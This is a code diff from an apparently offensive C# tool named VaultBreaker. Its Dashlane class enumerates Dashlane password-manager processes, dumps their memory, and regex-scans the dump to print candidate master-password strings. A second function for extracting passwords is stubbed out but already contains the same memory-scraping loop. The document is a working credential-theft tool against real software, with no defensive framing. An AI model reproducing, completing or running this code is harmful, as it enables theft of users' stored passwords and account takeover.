@@ -10,38 +10,47 @@ namespace VaultBreaker.Core
 
 	class Dashlane
 	{
-		public static void dumpDashlane()
+		public static void dumpDashlaneMaster()
 		{
-			Process[] procs = Process.GetProcessesByName("Dashlane");
-			Process[] all = Process.GetProcesses();
-
-			foreach(var proc in all)
-			{
-				DebugFunctions.writeDebug(proc.Id + " - " + proc.ProcessName);
-			}
-			/**
-			if(procs.Length < 1)
-			{
-				DebugFunctions.writeDebug("No Processes Found");
-				Console.ReadKey();
-			}
-	**/
+            Process[] procs = Process.GetProcessesByName("dashlane");
 			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
 			foreach (var proc in procs)
 			{
-				DebugFunctions.writeDebug("Dumping Memory");
+                DebugFunctions.writeDebug(String.Format("Enumerating Process: {0} - {1}", proc.Id, proc.ProcessName), Globals.DebugMode);
+                DebugFunctions.writeDebug("Dumping Memory", Globals.DebugMode);
 				string strResult = DebugFunctions.ReturnCleanASCII(MemoryHelper.dumpProcessMemory(proc).Replace("\0",string.Empty));
-				DebugFunctions.writeDebug("Parsing Memory Dump");
+				DebugFunctions.writeDebug("Parsing Memory Dump. Warning this could take a while.", Globals.DebugMode);
 				//string r = @"\s{3}(.+)\s{3}receiveNotif";
 				string r = @"\s{3}(.+)\0{3}";
-				File.WriteAllText("dmp.txt",strResult);
 				foreach(Match m in Regex.Matches(strResult, r))
 				{
 					Console.WriteLine("[DEBUG] '{0}' found at index {1}", DebugFunctions.ReturnCleanASCII(m.Value), m.Index);
 				}
-				DebugFunctions.writeDebug("Finished");
+				DebugFunctions.writeDebug("Finished", Globals.DebugMode);
 				Console.ReadKey();
 			}
 		}
-	}
+        public static void dumpDashLanePasswords()
+        {
+            Console.WriteLine("[!] Not Fully Implemented Yet!");
+            return;
+
+            //I'll come back to you, I promise.
+            Process[] procs = Process.GetProcessesByName("Dashlane");
+            Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
+            foreach (var proc in procs)
+            {
+                string strResult = DebugFunctions.ReturnCleanASCII(MemoryHelper.dumpProcessMemory(proc).Replace("\0", string.Empty));
+                DebugFunctions.writeDebug("Parsing Memory Dump", Globals.DebugMode);
+                //string r = @"\s{3}(.+)\s{3}receiveNotif";
+                string r = @"CDATA";
+                foreach (Match m in Regex.Matches(strResult, r))
+                {
+                    Console.WriteLine("[DEBUG] '{0}' found at index {1}", DebugFunctions.ReturnCleanASCII(m.Value), m.Index);
+                }
+                DebugFunctions.writeDebug("Finished", Globals.DebugMode);
+                Console.ReadKey();
+            }
+        }
+    }
 }
